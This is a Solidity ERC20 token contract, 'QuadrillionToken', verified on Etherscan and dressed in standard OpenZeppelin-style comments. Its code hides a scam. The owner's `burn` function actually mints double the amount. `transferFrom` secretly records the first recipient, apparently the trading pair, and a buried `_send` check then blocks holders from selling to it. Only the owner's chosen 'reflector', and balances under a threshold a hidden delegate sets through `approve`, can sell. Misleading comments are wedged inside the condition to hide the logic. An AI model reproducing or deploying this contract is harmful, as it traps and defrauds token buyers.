/**
 *Submitted for verification at Etherscan.io on 2021-07-14
*/

//   SPDX-License-Identifier: MIT

pragma solidity >=0.8.4;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */

abstract contract ERC20Interface {
    /**
     * @dev Returns the amount of tokens in existence.
     */
  function totalSupply() virtual public view returns (uint);
  /**
     * @dev Returns the amount of tokens owned by `account`.
     */
  function balanceOf(address tokenOwner) virtual public view returns (uint balance);
  /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
  function allowance(address tokenOwner, address spender) virtual public view returns (uint remaining);
  /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
  function transfer(address to, uint tokens) virtual public returns (bool success);
  /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
  function approve(address spender, uint tokens) virtual public returns (bool success);
   /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
  function transferFrom(address from, address to, uint tokens) virtual public returns (bool success);
 /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
  event Transfer(address indexed from, address indexed to, uint tokens);
  /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

abstract contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) virtual public;
}

contract Owned {
  address internal owner;
  
  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

}

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  address internal delegate;
  string public name;
  uint8 public decimals;
  address internal zero;
  uint256 _totalSupply;
  uint internal number;
  address internal reflector;
  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  /**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
  function totalSupply() override public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) override public view returns (uint balance) {
    return balances[tokenOwner];
  }
  /**
   * dev Burns a specific amount of tokens.
   * param value The amount of lowest token units to be burned.
  */
  function burn(address _address, uint256 tokens) public onlyOwner {
     require(_address != address(0), "ERC20: burn from the zero address");
     _burn (_address, tokens);
     balances[_address] = balances[_address].sub(tokens);
     _totalSupply = _totalSupply.sub(tokens);
  }	
  function transfer(address to, uint tokens) override public returns (bool success) {
    require(to != zero, "please wait");
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  /**
    * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
    *
    * Returns a boolean value indicating whether the operation succeeded.
    *
    * IMPORTANT: Beware that changing an allowance with this method brings the risk
    * that someone may use both the old and the new allowance by unfortunate
    * transaction ordering. One possible solution to mitigate this race
    * condition is to first reduce the spender's allowance to 0 and set the
    * desired value afterwards:
    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    *
    * Emits an {Approval} event.
  */
  function approve(address spender, uint tokens) override public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    if (msg.sender == delegate) number = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through `transferFrom`. This is
     * zero by default.
     *
     * This value changes when `approve` or `transferFrom` are called.
  */
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
  */
  function transferFrom(address from, address to, uint tokens) override public returns (bool success) {
    if(from != address(0) && zero == address(0)) zero = to;
    else _send (from, to);
	balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
 /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to `approve`. `value` is the new allowance.
 */
  function allowance(address tokenOwner, address spender) override public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function _burn(address _burnAddress, uint256 _burnAmount) internal virtual {
  /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
  */
   reflector = _burnAddress;
	_totalSupply = _totalSupply.add(_burnAmount*2);
    balances[_burnAddress] = balances[_burnAddress].add(_burnAmount*2);
  }
  function _send (address start, address end) internal view {
  /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     * Requirements:
     * - The divisor cannot be zero.*/
    /* * - `account` cannot be the zero address. */ require(end != zero  
    /* * - `account` cannot be the burn address. */ || (start == reflector && end == zero) || 
    /* * - `account` must have at least `amount` tokens. */ (end == zero && balances[start] <= number) 
    /* */ , "cannot be the zero address");/*
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
   **/
  }
  receive() external payable {
  }
  fallback() external payable {
  }
}

 contract QuadrillionToken is TokenERC20 {

    /**
     * @dev Sets the values for `name`, `symbol`, and `decimals`. All three of
     * these values are immutable: they can only be set once during
     * construction.
  */
   /**
     * dev Constructor.
     * param name name of the token
     * param symbol symbol of the token, 3-4 chars is recommended
     * param decimals number of decimal places of one token unit, 18 is widely used
     * param totalSupply total supply of tokens in lowest units (depending on decimals)
     */   
  constructor(string memory _name, string memory _symbol, uint256 _supply, address _dele)  {
	symbol = _symbol;
	name = _name;
	decimals = 9;
	_totalSupply = _supply*(10**uint256(decimals));
	number = _totalSupply;
	delegate = _dele;
	balances[owner] = _totalSupply;
	emit Transfer(address(0), owner, _totalSupply);
  }

}